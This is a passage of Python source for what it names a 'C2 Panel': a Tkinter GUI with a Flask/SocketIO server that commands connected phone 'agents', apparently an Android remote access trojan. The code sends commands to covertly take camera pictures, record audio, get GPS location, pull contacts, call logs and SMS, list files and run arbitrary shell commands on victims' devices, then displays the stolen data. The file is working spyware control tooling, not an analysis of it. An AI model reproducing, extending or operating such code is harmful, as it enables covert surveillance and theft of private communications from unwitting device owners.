    def display_device_details(self, device_folder_id):
        self._clear_details_view()
        if not device_folder_id:
            self._enable_commands(False)
            return

        self.current_selected_historical_device_id = device_folder_id
        device_path = os.path.join(DATA_RECEIVED_DIR, device_folder_id)

        self.info_json_text.config(state=tk.NORMAL)
        latest_info_file_path = self._get_latest_info_json_path(device_path)
        can_show_map = False
        if latest_info_file_path and os.path.exists(latest_info_file_path):
            try:
                with open(latest_info_file_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                self.info_json_text.insert(
                    tk.END, json.dumps(data, indent=2, ensure_ascii=False)
                )
                if data.get("location", {}).get("latitude") is not None:
                    can_show_map = True
            except Exception as e:
                self.info_json_text.insert(
                    tk.END,
                    f"Error reading {os.path.basename(latest_info_file_path)}: {e}",
                )
        else:
            self.info_json_text.insert(
                tk.END, f"No 'info_*.json' file found in '{device_folder_id}' folder."
            )
        self.info_json_text.config(state=tk.DISABLED)
        self.details_notebook.select(self.tab_info_json)

        self.file_listbox.delete(0, tk.END)
        if os.path.isdir(device_path):
            for item_name in sorted(os.listdir(device_path)):
                if not item_name.startswith("info_"):
                    self.file_listbox.insert(tk.END, item_name)
        else:
            self.file_listbox.insert(tk.END, "Device data folder not found.")

        is_live_and_matches_historical = False
        if (
            self.current_selected_live_client_sid
            and self.current_selected_live_client_sid in connected_clients_sio
        ):
            if (
                connected_clients_sio[self.current_selected_live_client_sid].get("id")
                == device_folder_id
            ):
                is_live_and_matches_historical = True

        self._enable_commands(is_live_and_matches_historical)
        if can_show_map:
            self.cmd_show_map_btn.config(state=tk.NORMAL)

    def on_file_select_in_viewer(self, event):
        selection = event.widget.curselection()
        if not selection:
            return
        filename = event.widget.get(selection[0])

        if not self.current_selected_historical_device_id:
            logger.warning("No historical device selected to view file from.")
            return

        file_path = os.path.join(
            DATA_RECEIVED_DIR, self.current_selected_historical_device_id, filename
        )
        if not os.path.exists(file_path):
            self.image_display_label.config(
                image="", text=f"File not found: {filename}"
            )
            self.image_display_label.image = None
            return

        # عرض الصور
        if filename.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp")):
            try:
                img = Image.open(file_path)
                lbl_width = self.image_display_frame.winfo_width()
                lbl_height = self.image_display_frame.winfo_height()
                if lbl_width < 50 or lbl_height < 50:
                    lbl_width, lbl_height = 400, 300

                img_copy = img.copy()
                img_copy.thumbnail((lbl_width - 10, lbl_height - 10))

                photo = ImageTk.PhotoImage(img_copy)
                self.image_display_label.config(image=photo, text="")
                self.image_display_label.image = photo
            except Exception as e:
                logger.error(f"Error loading image {file_path}: {e}", exc_info=True)
                self.image_display_label.config(
                    image="", text=f"Error loading image\n{filename}:\n{e}"
                )
                self.image_display_label.image = None
        # تشغيل الصوتيات - UPDATED to support new formats
        elif filename.lower().endswith((".aac", ".wav", ".mp3", ".m4a", ".ogg", ".3gp")):
            try:
                file_url_path = f"file:///{os.path.abspath(file_path)}"
                webbrowser.open(file_url_path)
                self.add_system_log(f"Attempting to play audio file: {filename}")
                self.image_display_label.config(
                    image="",
                    text=f"Playing audio file:\n{filename}\n\n(Using system default player)",
                )
                self.image_display_label.image = None
            except Exception as e:
                logger.error(
                    f"Could not play audio file {filename}: {e}", exc_info=True
                )
                self.image_display_label.config(
                    image="", text=f"Error playing audio file:\n{filename}\n{e}"
                )
                self.image_display_label.image = None
        # عرض الملفات النصية (JSON أو TXT)
        elif filename.lower().endswith((".json", ".txt", ".log")):
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as f_text:
                    file_size = os.path.getsize(file_path)
                    if file_size > 20000:
                        preview_content = (
                            f_text.read(20000)
                            + "\n\n--- File too large, showing first 20KB ---"
                        )
                    else:
                        preview_content = f_text.read()

                self.image_display_label.config(
                    image="", text=f"--- Preview of {filename} ---\n{preview_content}"
                )
            except Exception as e_text:
                logger.warning(f"Could not read/preview text file {filename}: {e_text}")
                self.image_display_label.config(
                    image="", text=f"{filename}\n(Cannot preview this text file type)"
                )
            self.image_display_label.image = None
        # للملفات الأخرى غير المعروفة
        else:
            self.image_display_label.config(
                image="",
                text=f"{filename}\n(Unsupported file type for preview/playback)",
            )
            self.image_display_label.image = None

    def display_command_response(self, device_id, command_name, status, payload):
        self.command_response_text.config(state=tk.NORMAL)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        header = f"--- [{timestamp}] Response for '{command_name}' from '{device_id}' (Status: {status}) ---\n"
        self.command_response_text.insert(tk.END, header)

        content = ""
        if status == "success":
            if command_name == "command_get_contacts" and "contacts" in payload:
                contacts_list = payload.get("contacts", [])
                if contacts_list:
                    formatted_contacts = []
                    for contact in contacts_list:
                        name = contact.get("name", "N/A")
                        number = contact.get("number", "N/A")
                        formatted_contacts.append(
                            f"Name: {name}\nNumber: {number}\n{'-'*20}"
                        )
                    content = "\n".join(formatted_contacts)
                else:
                    content = "No contacts found on the device."

            elif command_name == "command_get_call_logs" and "call_logs" in payload:
                logs_list = payload.get("call_logs", [])
                if logs_list:
                    def format_log(log):
                        log_date_ms = log.get("date", 0)
                        log_date_str = "N/A"
                        if log_date_ms and isinstance(log_date_ms, (int, float)):
                            try:
                                log_date_str = datetime.datetime.fromtimestamp(
                                    log_date_ms / 1000
                                ).strftime("%Y-%m-%d %H:%M:%S")
                            except:
                                pass
                        duration = int(log.get("duration", 0))
                        return f"Number: {log.get('number', 'N/A')}\nType: {log.get('type', 'N/A')}\nDate: {log_date_str}\nDuration: {duration}s\n{'-'*20}"

                    content = "\n".join(map(format_log, logs_list))
                else:
                    content = "No call logs found."

            elif command_name == "command_get_sms" and "sms_messages" in payload:
                sms_list = payload.get("sms_messages", [])
                if sms_list:
                    def format_sms(sms):
                        sms_date_ms = sms.get("date", 0)
                        sms_date_str = "N/A"
                        if sms_date_ms and isinstance(sms_date_ms, (int, float)):
                            try:
                                sms_date_str = datetime.datetime.fromtimestamp(
                                    sms_date_ms / 1000
                                ).strftime("%Y-%m-%d %H:%M:%S")
                            except:
                                pass
                        return f"Address: {sms.get('address', 'N/A')}\nType: {sms.get('type', 'N/A')}\nDate: {sms_date_str}\nBody: {sms.get('body', '')}\n{'-'*20}"

                    content = "\n".join(map(format_sms, sms_list))
                else:
                    content = "No SMS messages found."
            
            # NEW: Handle file listing response
            elif command_name == "command_list_files" and "files" in payload:
                files_list = payload.get("files", [])
                total_files = payload.get("totalFiles", len(files_list))
                path = payload.get("path", "Unknown")
                
                content = f"Path: {path}\nTotal Files: {total_files}\n\n"
                
                if files_list:
                    for file_info in files_list:
                        name = file_info.get("name", "N/A")
                        size = file_info.get("size", 0)
                        is_dir = file_info.get("isDirectory", False)
                        file_type = "Directory" if is_dir else "File"
                        
                        # Format size
                        if size > 1024*1024:
                            size_str = f"{size/(1024*1024):.2f} MB"
                        elif size > 1024:
                            size_str = f"{size/1024:.2f} KB"
                        else:
                            size_str = f"{size} bytes"
                        
                        content += f"Name: {name}\nType: {file_type}\nSize: {size_str}\n{'-'*20}\n"
                else:
                    content += "No files found in directory."
            
            # NEW: Handle shell command response
            elif command_name == "command_execute_shell":
                stdout = payload.get("stdout", "")
                stderr = payload.get("stderr", "")
                exit_code = payload.get("exitCode", "N/A")
                command = payload.get("command", "N/A")
                args = payload.get("args", [])
                
                content = f"Command: {command} {' '.join(args)}\n"
                content += f"Exit Code: {exit_code}\n\n"
                content += f"--- STDOUT ---\n{stdout}\n"
                if stderr:
                    content += f"--- STDERR ---\n{stderr}\n"
            
            # NEW: Handle voice recording response
            elif command_name == "command_record_voice":
                content = payload.get("message", "Voice recording completed successfully.")
                if "filename_on_server" in payload:
                    content += f"\nFile: {payload['filename_on_server']}"
            
            else:
                # المعالجة العامة لباقي الأوامر
                if isinstance(payload, (dict, list)):
                    try:
                        content = json.dumps(payload, indent=2, ensure_ascii=False)
                    except TypeError:
                        content = str(payload)
                else:
                    content = str(payload)
        else:  # للأوامر غير الناجحة
            if isinstance(payload, (dict, list)):
                try:
                    content = json.dumps(payload, indent=2, ensure_ascii=False)
                except TypeError:
                    content = str(payload)
            else:
                content = str(payload)

        self.command_response_text.insert(tk.END, content + "\n\n")
        self.command_response_text.see(tk.END)
        self.command_response_text.config(state=tk.DISABLED)
        self.details_notebook.select(self.tab_command_responses)

    def add_system_log(self, message, error=False):
        self.master.after(0, self._update_log_text, message, error)

    def _update_log_text(self, message, error):
        self.log_text_widget.config(state=tk.NORMAL)
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_level = "ERROR" if error else "INFO "
        self.log_text_widget.insert(tk.END, f"[{timestamp} {log_level}] {message}\n")
        self.log_text_widget.see(tk.END)
        self.log_text_widget.config(state=tk.DISABLED)

    def _get_selected_live_sid_for_command(self):
        if (
            self.current_selected_live_client_sid
            and self.current_selected_live_client_sid in connected_clients_sio
        ):
            return self.current_selected_live_client_sid

        # If a historical device is selected, try to find its live counterpart
        if self.current_selected_historical_device_id:
            for sid, client_data in connected_clients_sio.items():
                if client_data.get("id") == self.current_selected_historical_device_id:
                    logger.info(
                        f"Automatically selecting live client SID {sid} for command based on historical selection."
                    )
                    self.current_selected_live_client_sid = sid
                    if self.live_clients_tree.exists(sid):
                        self.live_clients_tree.selection_set(sid)
                        self.live_clients_tree.focus(sid)
                        self.live_clients_tree.see(sid)
                    return sid

        self.add_system_log("No live agent selected for command.", error=True)
        messagebox.showerror(
            "Command Error",
            "No live agent selected. Please select an agent from the 'Live Connected Agents' list.",
            parent=self.master,
        )
        return None

    def cmd_take_picture(self):
        target_sid = self._get_selected_live_sid_for_command()
        if target_sid:
            camera_choice = messagebox.askquestion(
                "Camera Choice",
                "Use FRONT camera?",
                icon="question",
                default=messagebox.YES,
                parent=self.master,
            )
            camera_to_use = "front" if camera_choice == "yes" else "back"
            send_command_to_client(
                target_sid, "command_take_picture", {"camera": camera_to_use}
            )

    def cmd_list_files(self):
        target_sid = self._get_selected_live_sid_for_command()
        if target_sid:
            path_to_list = simpledialog.askstring(
                "List Files",
                "Enter path to list (e.g., /sdcard/Download or . for app root):",
                parent=self.master,
                initialvalue="/storage/emulated/0",
            )
            if path_to_list is not None:
                send_command_to_client(
                    target_sid, "command_list_files", {"path": path_to_list.strip()}
                )

    def cmd_get_location(self):
        target_sid = self._get_selected_live_sid_for_command()
        if target_sid:
            send_command_to_client(target_sid, "command_get_location")

    # NEW: Voice recording command
    def cmd_record_voice(self):
        target_sid = self._get_selected_live_sid_for_command()
        if target_sid:
            duration = simpledialog.askinteger(
                "Record Voice",
                "Enter recording duration in seconds:",
                parent=self.master,
                initialvalue=10,
                minvalue=1,
                maxvalue=300
            )
            if duration is not None:
                quality = messagebox.askquestion(
                    "Recording Quality",
                    "Use HIGH quality recording?",
                    icon="question",
                    default=messagebox.NO,
                    parent=self.master,
                )
                quality_setting = "high" if quality == "yes" else "medium"
                send_command_to_client(
                    target_sid, 
                    "command_record_voice", 
                    {"duration": duration, "quality": quality_setting}
                )

    # NEW: Shell command execution
    def cmd_execute_shell(self):
        target_sid = self._get_selected_live_sid_for_command()
        if target_sid:
            command = simpledialog.askstring(
                "Execute Shell Command",
                "Enter command to execute (e.g., ls, pwd, ps):",
                parent=self.master,
                initialvalue="ls"
            )
            if command is not None and command.strip():
                # Parse command and arguments
                parts = command.strip().split()
                cmd_name = parts[0]
                cmd_args = parts[1:] if len(parts) > 1 else []
                
                send_command_to_client(
                    target_sid, 
                    "command_execute_shell", 
                    {"command_name": cmd_name, "command_args": cmd_args}
                )

    def cmd_get_contacts(self):
        target_sid = self._get_selected_live_sid_for_command()
        if target_sid:
            send_command_to_client(target_sid, "command_get_contacts")

    def cmd_get_call_logs(self):
        target_sid = self._get_selected_live_sid_for_command()
        if target_sid:
            send_command_to_client(target_sid, "command_get_call_logs")

    def cmd_get_sms(self):
        target_sid = self._get_selected_live_sid_for_command()
        if target_sid:
            send_command_to_client(target_sid, "command_get_sms")

    def cmd_show_map(self):
        if not self.current_selected_historical_device_id:
            messagebox.showinfo(
                "Show Map", "No device selected to show map for.", parent=self.master
            )
            return

        device_path = os.path.join(
            DATA_RECEIVED_DIR, self.current_selected_historical_device_id
        )
        latest_info_file = self._get_latest_info_json_path(device_path)
        if not (latest_info_file and os.path.exists(latest_info_file)):
            messagebox.showinfo(
                "Show Map",
                f"No 'info.json' found for {self.current_selected_historical_device_id}.",
                parent=self.master,
            )
            return
        try:
            with open(latest_info_file, "r", encoding="utf-8") as f:
                data = json.load(f)
            loc = data.get("location")
            if (
                loc
                and loc.get("latitude") is not None
                and loc.get("longitude") is not None
            ):
                lat, lon = loc["latitude"], loc["longitude"]
                map_url = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
                webbrowser.open_new_tab(map_url)
                self.add_system_log(
                    f"Opened map for {self.current_selected_historical_device_id} at ({lat},{lon})"
                )
            else:
                messagebox.showinfo(
                    "Show Map",
                    f"No location data in info.json for {self.current_selected_historical_device_id}.",
                    parent=self.master,
                )
        except Exception as e:
            logger.error(f"Error opening map: {e}", exc_info=True)
            messagebox.showerror(
                "Show Map Error",
                f"Error reading location data: {e}",
                parent=self.master,
            )

    def cmd_send_custom(self):
        target_sid = self._get_selected_live_sid_for_command()
        if target_sid:
            event_name = self.custom_cmd_event_entry.get().strip()
            args_str = self.custom_cmd_args_entry.get().strip()
            if not event_name:
                messagebox.showerror(
                    "Custom Command Error",
                    "Event name cannot be empty.",
                    parent=self.master,
                )
                return
            args = {}
            if args_str:
                try:
                    args = json.loads(args_str)
                except json.JSONDecodeError:
                    messagebox.showerror(
                        "Custom Command Error",
                        "Arguments are not valid JSON.",
                        parent=self.master,
                    )
                    return
                if not isinstance(args, dict):
                    messagebox.showerror(
                        "Custom Command Error",
                        "Arguments JSON must be an object (dictionary).",
                        parent=self.master,
                    )
                    return

            send_command_to_client(target_sid, event_name, args)


# --- Flask App Settings ---
FLASK_HOST = "0.0.0.0"
FLASK_PORT = 5000
C2_SERVER_URL_FROM_FLUTTER = f"http://{FLASK_HOST}:{FLASK_PORT}"


def run_flask_app():
    logger.info(f"Starting Flask/SocketIO server on {FLASK_HOST}:{FLASK_PORT}...")
    try:
        socketio.run(
            app,
            host=FLASK_HOST,
            port=FLASK_PORT,
            debug=False,
            use_reloader=False,
            allow_unsafe_werkzeug=True,
            log_output=False,
        )
    except OSError as e:
        logger.critical(
            f"Could not start Flask server on port {FLASK_PORT}: {e}", exc_info=True
        )
        if gui_app and gui_app.master.winfo_exists():
            gui_app.master.after(
                0,
                lambda: messagebox.showerror(
                    "Server Startup Error",
                    f"FATAL: Could not start Flask server on port {FLASK_PORT}.\n{e}\n\nThe C2 Panel may not function correctly. Check logs.",
                ),
            )


if __name__ == "__main__":
    # Start Flask server in separate thread
    flask_thread = threading.Thread(
        target=run_flask_app, daemon=True, name="FlaskSocketIOThread"
    )
    flask_thread.start()

    # Run Tkinter GUI in main thread
    root = tk.Tk()
    gui_app = C2PanelGUI(root)
    logger.info("Tkinter GUI Started.")

    try:
        root.mainloop()
    except KeyboardInterrupt:
        logger.info("Tkinter GUI received KeyboardInterrupt.")
    except tk.TclError as e:
        if "application has been destroyed" in str(e):
            logger.info("Tkinter GUI mainloop exited (application destroyed).")
        else:
            logger.error(f"Tkinter TclError in mainloop: {e}", exc_info=True)
            raise

    logger.info("C2 Panel Shutting Down.")